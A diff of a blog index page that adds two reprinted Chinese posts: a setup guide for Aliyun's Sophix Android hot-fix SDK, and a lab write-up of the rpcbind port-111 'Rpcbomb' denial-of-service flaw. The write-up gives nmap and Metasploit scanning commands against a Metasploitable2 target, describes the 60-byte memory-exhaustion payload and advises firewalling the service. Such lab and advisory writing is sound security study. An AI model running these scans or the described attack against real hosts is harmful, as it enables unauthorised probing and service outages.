@@ -86,6 +86,286 @@
 
     
         <h2 class="title">
+            <a href="/2024/01/15/Aliyun-Sophix/">
+                阿里热修复Sophix的使用指南
+            </a>
+        </h2>
+    
+    <time>
+        Jan 15, 2024
+    </time>
+    <section class="content">
+        <h1><span id="阿里热修复sophix的使用指南">阿里热修复Sophix的使用指南</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://juejin.cn/post/7250377976134533177">五问</a> 并作补充</p>
+</blockquote>
+<h2><span id="一-阿里云热修复sophix的介绍">一、阿里云热修复Sophix的介绍</span></h2><h3><span id="11-首先看一下市场上热修复方案的比较">1.1、首先看一下市场上热修复方案的比较：</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434850.html">https://help.aliyun.com/document_detail/434850.html</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/1.png" alt="image"></p>
+</blockquote>
+<h3><span id="12-收费情况">1.2、收费情况：</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434858.html">https://help.aliyun.com/document_detail/434858.html</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/2.png" alt="image"></p>
+</blockquote>
+<h2><span id="二-接入指南">二、接入指南</span></h2><h3><span id="21-准备">2.1、准备</span></h3><blockquote>
+<ol>
+<li>准备好阿里云账号</li>
+<li>进行身份实名认证</li>
+<li><a href="https://link.juejin.cn/?target=https://help.aliyun.com/product/434086.html">移动研发平台EMAS</a>，进行项目创建,创建后会生成一个<code>aliyun-emas-services.json 文件</code>，里面包含了热修复sdk接入时所需的密钥，很重要</li>
+</ol>
+</blockquote>
+<h3><span id="22-emas平台的添加流程如下">2.2、EMAS平台的添加流程如下：</span></h3><h4><span id="221-添加应用">2.2.1、添加应用</span></h4><blockquote>
+<p><img src="/2024/01/15/Aliyun-Sophix/3.png" alt="image"></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/4.png" alt="image"></p>
+<p>生成应用的key信息文件，如果建议按需接入所需功能，没必要也不安全，按下图将文件放入到app中</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/5.png" alt="image"></p>
+<p>下图的红框中的添加sdk也是，添加emas平台中的所有功能，建议按需接入某个功能（如：热修），另外该插件在Android <code>gradle 7</code>之上会报错</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/6.png" alt="image"></p>
+</blockquote>
+<h3><span id="23-热修复接入">2.3、热修复接入</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434883.html">https://help.aliyun.com/document_detail/434883.html</a></p>
+<p><strong>注意点如下：</strong></p>
+<p>使用<code>gradle plugin版本高于4.2时</code>，可能会自动开启资源优化。开启资源优化后，资源名称被混淆，会导致补丁工具在生成补丁时一直卡在”开始构建补丁…..”，无法正常解析apk包。<code>解决方案：在gradle.properties 中新增android.enableResourceOptimizations=false，</code>重新生成基线包和修复包，然后再生成补丁。</p>
+<p>密钥的使用推荐在<code>SophixStubApplication 中初始化</code>，而<code>不是在AndroidManifest文件中配置</code></p>
+<p>使用android studio打包生成apk时，要关闭instant run。</p>
+<p><a href="https://link.juejin.cn/?target=https://help.aliyun.com/document_detail/434885.htm%23h3-h2c-ysc-sto">queryAndLoadNewPatch方法</a>用来请求控制台发布的补丁包，会涉及设备信息读取，所以必须在用户同意隐私协议之后调用。另外用户可根据业务情况，酌情考虑是否打开此开关。</p>
+<p>但不可放在attachBaseContext中，否则无网络权限，建议放在主进程用户同意隐私协议之后的任意时刻。</p>
+<p>接入流程步骤如下：</p>
+<p><strong>添加工程依赖</strong></p>
+<h4><span id="1-android-studio集成方式">1. Android Studio集成方式</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gradle远程仓库依赖, 打开项目找到App的build.gradle文件，添加如下配置：</span><br><span class="line"></span><br><span class="line">添加Maven仓库地址：</span><br><span class="line"></span><br><span class="line">****</span><br><span class="line"></span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string">repositories &#123;</span></span><br><span class="line"><span class="string">   maven &#123;</span></span><br><span class="line"><span class="string">       url &quot;http://maven.aliyun.com/nexus/content/repositories/releases&quot;</span></span><br><span class="line"><span class="string">   &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span></span><br></pre></td></tr></table></figure>
+
+<h4><span id="2添加gradle坐标版本依赖">2.添加gradle坐标版本依赖：</span></h4><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    ......</span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">&quot;com.xxx.xxx&quot;</span> <span class="comment">//包名</span></span><br><span class="line">        ......</span><br><span class="line">        ndk &#123;</span><br><span class="line">            <span class="comment">//选择要添加的对应cpu类型的.so库。</span></span><br><span class="line">            <span class="comment">//热修复支持五种</span></span><br><span class="line">            abiFilters <span class="string">&#x27;arm64-v8a&#x27;</span>, <span class="string">&#x27;armeabi&#x27;</span>, <span class="string">&#x27;armeabi-v7a&#x27;</span>, <span class="string">&#x27;x86&#x27;</span>, <span class="string">&#x27;x86_64&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br><span class="line">dependencies &#123;</span><br><span class="line">    ......</span><br><span class="line">        compile <span class="string">&#x27;com.aliyun.ams:alicloud-android-hotfix:3.3.5&#x27;</span></span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="3添加应用权限">3.添加应用权限</span></h4><p>Sophix SDK使用到以下权限，使用Maven依赖或者aar依赖可以不用配置。具体配置在AndroidManifest.xml中。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span> /&gt;</span><br><span class="line">&lt;uses-permission android:<span class="attr">name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="4配置androidmanifest文件">4.配置AndroidManifest文件</span></h4><p><code>也可以不用配置(直接在SophixStubApplication，文件中初始化配置即可（推荐在SophixStubApplication中配置）)</code>，在 <a href="https://link.juejin.cn/?target=https://help.aliyun.com/product/434086.html">移动研发平台EMAS</a>，进行项目创建,创建后会生成一个<code>aliyun-emas-services.json 文件</code>，里面包含了热修复sdk接入时所需的密钥</p>
+<p>在<code>AndroidManifest.xml</code>中间的<code>application</code>节点下添加如下配置：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.IDSECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;App ID&quot;</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.APPSECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;App Secret&quot;</span> /&gt;</span><br><span class="line">&lt;meta-data</span><br><span class="line">android:<span class="attr">name</span>=<span class="string">&quot;com.taobao.android.hotfix.RSASECRET&quot;</span></span><br><span class="line">android:<span class="attr">value</span>=<span class="string">&quot;RSA密钥&quot;</span> /&gt;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="5-混淆配置按需配置">5. 混淆配置,按需配置</span></h4><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line"><span class="meta">#基线包使用，生成mapping.txt</span></span><br><span class="line">-printmapping mapping.txt</span><br><span class="line"><span class="meta">#生成的mapping.txt在app/build/outputs/mapping/release路径下，移动到/app路径下</span></span><br><span class="line"><span class="meta">#修复后的项目使用，保证混淆结果一致</span></span><br><span class="line"><span class="meta">#-applymapping mapping.txt</span></span><br><span class="line"><span class="meta">#hotfix</span></span><br><span class="line">-keep <span class="keyword">class</span> <span class="title">com.taobao.sophix</span>.**&#123;*;&#125;</span><br><span class="line">-keep <span class="keyword">class</span> <span class="title">com.ta.utdid2.device</span>.**&#123;*;&#125;</span><br><span class="line"><span class="meta">#防止inline</span></span><br><span class="line">-dontoptimize</span><br><span class="line">```</span><br><span class="line">**</span><br><span class="line">**重要**</span><br><span class="line"></span><br><span class="line">开启混淆时，生成修复包要使用旧包的mapping文件以保证混淆结果一致。</span><br><span class="line">初始化</span><br></pre></td></tr></table></figure>
+
+<h4><span id="6-初始化">6. 初始化</span></h4><p>初始化的调用应该尽可能的早，必须在<code>Application.attachBaseContext()</code>的最开始（在super.attachBaseContext之后，如果有Multidex，也需要在Multidex.install之后）进行SDK初始化操作，初始化之前不能用到其他自定义类，否则极有可能导致崩溃。而查询服务器是否有可用补丁的操作可以在后面的任意地方。不建议在<code>Application.onCreate()</code>中初始化，因为如果带有ContentProvider，就会使得Sophix初始化时机太迟从而引发问题。</p>
+<p>Sophix最新版本引入了新的初始化方式。</p>
+<p>原来的初始化方式仍然可以使用。只是新方式可以提供更全面的功能修复支持，将会带来以下优点：</p>
+<ul>
+<li>初始化与应用原先业务代码完全隔离，使得原先真正的Application可以修复，并且减少了补丁预加载时间等等。</li>
+<li>新方式能够更完美地兼容Android 8.0以后版本。</li>
+</ul>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SophixStubApplication</span> <span class="keyword">extends</span> <span class="title class_">SophixApplication</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">TAG</span> <span class="operator">=</span> <span class="string">&quot;SophixStubApplication&quot;</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">appVersion</span> <span class="operator">=</span> <span class="string">&quot;0.0.0&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 此处SophixEntry应指定真正的Application，并且保证RealApplicationStub类名不被混淆。</span></span><br><span class="line">    <span class="meta">@SophixEntry(MyApplication.class)</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">RealApplicationStub</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">attachBaseContext</span><span class="params">(Context base)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.attachBaseContext(base);</span><br><span class="line">        initSophix();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initSophix</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            appVersion = <span class="built_in">this</span>.getPackageManager()</span><br><span class="line">                    .getPackageInfo(<span class="built_in">this</span>.getPackageName(), <span class="number">0</span>)</span><br><span class="line">                    .versionName;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">SophixManager</span> <span class="variable">instance</span> <span class="operator">=</span> SophixManager.getInstance();</span><br><span class="line">        List&lt;String&gt; tags = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">///todo 构建正式包之前需要修改为：</span></span><br><span class="line">        <span class="comment">///tags.add(&quot;production&quot;);</span></span><br><span class="line">        tags.add(<span class="string">&quot;test&quot;</span>); <span class="comment">//这个值就是，你进行灰度包热修时，要填写的tag</span></span><br><span class="line">        <span class="keyword">for</span> (String tag : tags) &#123;</span><br><span class="line">            Log.e(TAG, <span class="string">&quot;sophix tag:&quot;</span> + tag);</span><br><span class="line">        &#125;</span><br><span class="line">        instance.setContext(<span class="built_in">this</span>)</span><br><span class="line">                .setAppVersion(appVersion)</span><br><span class="line">                .setEnableDebug(<span class="literal">false</span>)</span><br><span class="line">                .setEnableFullLog()</span><br><span class="line">                .setTags(tags)</span><br><span class="line">                .setSecretMetaData(<span class="string">&quot;你自己的hotfix.idSecret&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;你自己的emas.appSecret&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;你自己的hotfix.rsaSecret&quot;</span>)</span><br><span class="line">                .setPatchLoadStatusStub(<span class="keyword">new</span> <span class="title class_">PatchLoadStatusListener</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onLoad</span><span class="params">(<span class="keyword">final</span> <span class="type">int</span> mode, <span class="keyword">final</span> <span class="type">int</span> code, <span class="keyword">final</span> String info, <span class="keyword">final</span> <span class="type">int</span> handlePatchVersion)</span> &#123;</span><br><span class="line">                        Log.e(TAG, <span class="string">&quot;sophix handlePatchVersion:&quot;</span> + handlePatchVersion + <span class="string">&quot; /code:&quot;</span> + code + <span class="string">&quot; /info:&quot;</span> + info);</span><br><span class="line">                        <span class="keyword">if</span> (code == PatchStatus.CODE_LOAD_SUCCESS) &#123;</span><br><span class="line">                            <span class="comment">///重启后会装载补丁会调用该方法</span></span><br><span class="line">                            Log.e(TAG, <span class="string">&quot;sophix load patch &quot;</span> + handlePatchVersion + <span class="string">&quot; success!&quot;</span> + info);</span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == PatchStatus.CODE_LOAD_RELAUNCH) &#123;</span><br><span class="line">                            <span class="comment">///补丁加载成功会调用该方法</span></span><br><span class="line">                            <span class="comment">// 如果需要在后台重启，建议此处用SharePreference保存状态。</span></span><br><span class="line">                            Log.e(TAG, <span class="string">&quot;sophix preload patch success. restart app to make effect. handlePatchVersion:&quot;</span> + handlePatchVersion);</span><br><span class="line">                          </span><br><span class="line">                            <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                            intent.putExtra(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;恭喜你，成功接收到发送的广播&quot;</span> + PatchStatus.CODE_LOAD_RELAUNCH);</span><br><span class="line">                            intent.setAction(<span class="string">&quot;可使用重启广播重启&quot;</span>);</span><br><span class="line">                            sendBroadcast(intent);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).initialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4><span id="7最后需要把androidmanifest里面的application改为这个新增的sophixstubapplication类">7.最后，需要把AndroidManifest里面的application改为这个新增的SophixStubApplication类：</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;application</span><br><span class="line">        android:name=&quot;com.my.pkg.SophixStubApplication&quot;</span><br><span class="line">        ... ...&gt;</span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>
+
+<p>这样便完成了新方式的初始化接入改造。</p>
+</blockquote>
+<h2><span id="三-热修复打差量包流程-热修控制台地址">三、热修复打差量包流程 热修控制台地址</span></h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://emas.console.aliyun.com/service/devTool/hotfix/patch">https://emas.console.aliyun.com/service/devTool/hotfix/patch</a></p>
+</blockquote>
+<h3><span id="31-找到热修界面添加应用">3.1、找到热修界面添加应用</span></h3><blockquote>
+<p>如下图：<strong>注意</strong>应用版本必须与你的<code>versionName</code>一致，否则会<code>导致后续下发查找不到差量包</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/7.png" alt="image"></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/8.png" alt="image"></p>
+</blockquote>
+<h3><span id="32-打差量包">3.2、打差量包</span></h3><blockquote>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434864.html">https://help.aliyun.com/document_detail/434864.html</a></p>
+<ol>
+<li>准备好SophixPatchTool_windows打包工具各版本打包工具如下:</li>
+</ol>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_macos.zip">Mac版本打包工具下载</a></li>
+<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_windows.zip">Windows版本打包工具下载</a></li>
+<li><a target="_blank" rel="noopener" href="https://ams-hotfix-repo.oss-cn-shanghai.aliyuncs.com/SophixPatchTool_linux.zip">Linux版本打包工具地址</a></li>
+</ul>
+<ol>
+<li>打一个release的包</li>
+<li>再第2步的release包的基础上修改一些内容，在打一个release包</li>
+<li>利用工具开始打包，如下图</li>
+</ol>
+<p><strong>注意：</strong> 每次热修差量包的生成的基础包就是你上次发版后的包，并不是说你在进行第三次热修时，用第二次的热修包，作为基准包</p>
+<p><code>问题包：1.0-querelease-2022-12-07.apk，修复包：1.0-release-2022-12-07.apk</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/9.png" alt="image"></p>
+<p><code>打开工具：</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/10.png" alt="image"></p>
+<p><code>选择两个包填充</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/11.png" alt="image"></p>
+<p><code>选择设置填好keystore</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/12.png" alt="image"></p>
+<p><code>选择高级，默认如下图，强制冷启动就是补丁包下发后必须重启，建议勾选强制冷启动，为何：看下面解释</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/13.png" alt="image"></p>
+<p><code>Sophix何时走即时生效热修复，何时走冷启动修复？</code><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/53227.htm?spm=5176.2020520104.0.0.385a3f1bbai0Ta#topic-1993907">https://help.aliyun.com/document_detail/53227.htm?spm=5176.2020520104.0.0.385a3f1bbai0Ta#topic-1993907</a></p>
+<p><code>配置完成后点击Go开始打差量包</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/14.png" alt="image"></p>
+<p><code>成功</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/15.png" alt="image"></p>
+<p><code>sophix-patch.jar 就是打出的差量包</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/16.png" alt="image"></p>
+</blockquote>
+<h2><span id="四-上传补丁-发布">四、上传补丁-发布</span></h2><h3><span id="41-添加你的应用版本然后上传补丁">4.1、添加你的应用版本，然后上传补丁</span></h3><blockquote>
+<p><img src="/2024/01/15/Aliyun-Sophix/17.png" alt="image"></p>
+</blockquote>
+<h3><span id="42-发布补丁">4.2、发布补丁</span></h3><blockquote>
+<p><code>上传后点击发布如下图</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/18.png" alt="image"></p>
+<p><code>下载[hotfixdebug]工具验证你的补丁包是否成功</code>,调试流程原文如下链接：</p>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434866.html">https://help.aliyun.com/document_detail/434866.html</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/19.png" alt="image"></p>
+<p>调试没问题后点击上图的<code>新建发布</code></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/20.png" alt="image"></p>
+<p>发布的话：有全量，灰度两种，<code>灰度的话</code> ，需要设置指定标签<code>tag</code>，就是你的应用app中Sophix所配置的，如下图：（推荐是全量）</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/21.png" alt="image"></p>
+</blockquote>
+<h3><span id="43-发布成功后在app中调用查询补丁方法">4.3、发布成功后在app中调用查询补丁方法</span></h3><blockquote>
+<h3><span id="sophixmanagergetinstancequeryandloadnewpatch"><code>SophixManager.getInstance().queryAndLoadNewPatch()</code></span></h3><p>后续将回调<code>PatchLoadStatusListener</code>如下图</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/22.png" alt="image"></p>
+<p>依次出现热修状态码如下，状态码含义：</p>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/434886.html?spm=a2c4g.11186623.0.0.6cdf4b0cnRYOiA">https://help.aliyun.com/document_detail/434886.html?spm=a2c4g.11186623.0.0.6cdf4b0cnRYOiA</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/23.png" alt="image"></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/24.png" alt="image"></p>
+<p><strong>上图加载成功后提示需要重启后热修生效</strong></p>
+</blockquote>
+<h2><span id="五-测试用例">五、测试用例</span></h2><blockquote>
+<p><strong>1.</strong> 修改一个toast文案，然后修复成功。</p>
+<p><strong>2.</strong> 修改一张图片，增加一张新的图片进行展示，增加点击效果，增加一个新的类生成提示文案（mipmap-hdpi、drawable-xhdpi、drawable、都添加图片）</p>
+<p>drawable-xhdpi 中新增热修图片添加可能会存在问题：如下，然后按要求在drawable 中添加后，热修成功。</p>
+<p><a target="_blank" rel="noopener" href="https://help.aliyun.com/document_detail/338384.html">https://help.aliyun.com/document_detail/338384.html</a></p>
+<p><img src="/2024/01/15/Aliyun-Sophix/25.png" alt="image"></p>
+<p><strong>3.</strong> 添加assets文件，热修成功。 </p>
+<p><strong>4.</strong> <code>四大组件不行</code>，因为需要在AndroidManifest.xml文件中配置，热修的时候使用的话会报找不到的，需要注册异常，如下图</p>
+<p><img src="/2024/01/15/Aliyun-Sophix/26.png" alt="image"></p>
+<p><strong>5.</strong> 删除测试4中的组件跳转流程，热修测试成功，</p>
+<p><strong>6.</strong> 删除测试2中添加的xml中的代码与相关资源，热修测试成功</p>
+<p>注意：</p>
+<p> 1.热修包存在的话，每杀死app，初始化进来都会走</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">onLoad方法的回调</span><br><span class="line"></span><br><span class="line"><span class="attr">code</span> == PatchStatus.CODE_LOAD_SUCCESS</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/01/15/Aliyun-Sophix/27.png" alt="image"></p>
+<p>2.同一个热修包，设置不同的tag，然后点击下发的话都会下发一次</p>
+<p>3.清除热修包后，之前发布的版本都无效了，再次查询加载，都查不到了，只能之后在这个版本重新发布</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SophixManager<span class="selector-class">.getInstance</span>()<span class="selector-class">.cleanPatches</span>()</span><br></pre></td></tr></table></figure>
+
+<p>热修复书籍：<a target="_blank" rel="noopener" href="https://developer.aliyun.com/article/115122">https://developer.aliyun.com/article/115122</a></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Hard-Coding/" rel="tag">Hard Coding</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/Sophix/" rel="tag">Sophix</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/07/RPCBind-DDOS/">
+                111端口rpcbind漏洞
+            </a>
+        </h2>
+    
+    <time>
+        Dec 7, 2023
+    </time>
+    <section class="content">
+        <h1><span id="111端口rpcbind漏洞">111端口rpcbind漏洞</span></h1><blockquote>
+<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44110913/article/details/108852581">Mamba start</a> 并作补充</p>
+</blockquote>
+<h2><span id="简介">简介</span></h2><blockquote>
+<p>rpcbind是NFS中用来进行消息通知的服务</p>
+</blockquote>
+<h2><span id="实验环境">实验环境</span></h2><blockquote>
+<p>攻击机：<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=kali&spm=1001.2101.3001.7020">kali</a> linux<br>ip:192.168.172.134<br>目标机：Metasploittable2<br>ip:192.168.172.129</p>
+</blockquote>
+<h2><span id="攻击过程">攻击过程</span></h2><h3><span id="step1使用nmap探测">step1:使用nmap探测</span></h3><blockquote>
+<p>命令：<code>nmap 192.168.172.129</code></p>
+<p>命令：<code>nmap -sV -p 111 192.168.172.129</code></p>
+<p>命令：<code>nmap -p 111 --script=rpcinfo 192.168.172.129</code></p>
+</blockquote>
+<h3><span id="step2metasploit模块探测">step2:metasploit模块探测</span></h3><blockquote>
+<p>启动msf</p>
+<p>命令：<code>use auxiliary/scanner/misc/sunrpc_portmapper</code></p>
+<p>命令：<code>show options</code></p>
+<p>本文讲的是只需60字节就可通过rpcbind让服务器崩溃，全世界的人都知道这玩意儿的用处，人们就这么任由它一直开着，无语。所以，要么补上，要么关闭吧。</p>
+</blockquote>
+<h2><span id="写在后面">写在后面</span></h2><blockquote>
+<p>向rpcbind服务的UDP套接字发送60字节载荷，便可填充目标内存，搞崩主机系统。<br>圭多·乌兰肯，该漏洞发现者兼“Rpcbomb”漏洞利用程序开发者，抱怨称该软件包维护者毫无反应，他不得不自己写了补丁。</p>
+<p>漏洞利用&amp;补丁：<a target="_blank" rel="noopener" href="https://github.com/guidovranken/rpcbomb">https://github.com/guidovranken/rpcbomb</a></p>
+<p>他写道，Shodan搜索发现，互联网上开放 rpcbind 111 端口的主机有180万台。其中大多数都运行在AWS之类大规模托管上，用户总是直接沿用Linux发行版的默认配置(111端口开放)。</p>
+<p>如果你真的需要使用rpcbind服务(将远程过程调用RPC与地址绑定)，就把它置于防火墙后，限制111端口对外开放吧。最好就是直接关了。</p>
+<p>GitHub上的补丁足够小，开发者们应该可以验证这些补丁的短小精悍：rpcbind只需要两行代码就能修复，不像libtirpc要256行。</p>
+<p>乌兰肯称，该漏洞可使攻击者在远程rpcbind绑定主机上分配任意大小的内存(每次攻击最高可达4GB)，除非进程崩溃，或者管理员挂起&#x2F;重启rpcbind服务，否则该内存不会被释放。</p>
+<p>当然，除了不断占用目标系统的内存，攻击者还可以干别的事，因为有些软件在内存分配失败的时候，是会发生不可预知的错误的。</p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/DOS/" rel="tag">DOS</a><a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/RPCBind/" rel="tag">RPCBind</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2023/12/07/XDebug-RCE/">
+                XDebug 远程调试漏洞（代码执行）
+            </a>
+        </h2>
+    
+    <time>
